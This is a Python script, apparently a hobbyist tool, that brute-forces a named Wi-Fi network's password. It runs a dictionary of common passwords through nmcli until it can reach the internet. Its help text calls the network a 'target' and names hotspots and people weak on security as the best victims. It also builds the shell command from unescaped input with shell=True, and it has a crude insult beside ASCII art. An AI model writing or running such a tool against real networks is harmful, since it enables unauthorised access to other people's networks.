import subprocess
import requests
import time
import os

def check_internet_connection():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.ConnectionError:
        return False


def connect_wifi(ssid, password):
    try:
        # Execute nmcli command to connect to WiFi
        cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
        subprocess.run(cmd, shell=True, check=True)
        return True
    except subprocess.CalledProcessError as e:
        print("Error:", e)
        return False

help_commends = ["/h","/help"]
exit_commends = ["/esc","/exit"]
failed = 0
os.system("clear") and os.system("cls")


print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣯⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣼⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣴⣶⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⠟⠁⠉⠻⠿⠿⠿⠿⠟⠛⠛⠉⢁⡀⢀⡈⠉⠛⠛⠻⠿⠿⠿⠿⠟⠋⠀⠙⢿⣿⣿⣿⣿⣿                     In your ass , Danial")
print("⣿⣿⣿⣿⣿⣿⣦⡀⠀⣀⣠⣤⣤⣤⡀⠀⠀⠀⠘⠁⠈⠃⠀⠀⠀⢀⣠⣤⣤⣤⣀⠀⠀⣠⣾⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⡿⠃⠀⣤⡆⠀⢰⡆⠀⢰⣤⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⣿⡇⠀⢸⡇⠀⢸⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⣿⡇⠀⢸⡇⠀⢸⣿⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⡇⠀⢸⡇⠀⢸⣿⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⡇⠀⢸⡇⠀⢸⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣿⡇⠀⢸⡇⠀⢸⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡇⠀⢸⡇⠀⢸⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣇⠀⢸⡇⠀⣸⣿⣠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n\n")
print("\033[91mNote 1: It is better to be near the target Modem")
print("Note 2: Connections that are hotspots usually have easier passwords than modems and have a higher chance of success\n\033[0m")
wifi_name = input("Enter a valid Wi-Fi name (SSID) - (/h for help) :")
if wifi_name in help_commends:
    os.system("clear") and os.system("cls")
    print("/exit or /esc to exit")
    print("Enter the name of the target modem to be checked with the most popular 3337 passwords of more than 8 digits")
    print("Note: This code does not use the random method")
    print("Note: This code is stupidly slow and you should not count on it too much")
    print("The best results are for hotspots and weak people in terms of security")
    print("\n\nI'm sorry, but you have to run the code again, I didn't feel like writing a code to get you out of here")
elif wifi_name in exit_commends:
    exit()
else:
    with open("Passwords.txt", 'r') as file:
                lines = file.readlines()
                for line in lines:
                    print(f"Password testing now : {line.strip()}")
                    if connect_wifi(wifi_name, line.strip()):
                        if check_internet_connection():
                            print("Connected to WiFi successfully!")
                            print(f"Password for {wifi_name} is {line.strip()}")
                            exit()
                        else:
                            print("Failed to connect to WiFi.")
                            failed += 1
                            print(f"{failed} times failed")
                    else:
                        print("Failed to connect to WiFi.")
                        failed += 1
                        print(f"{failed} times failed")
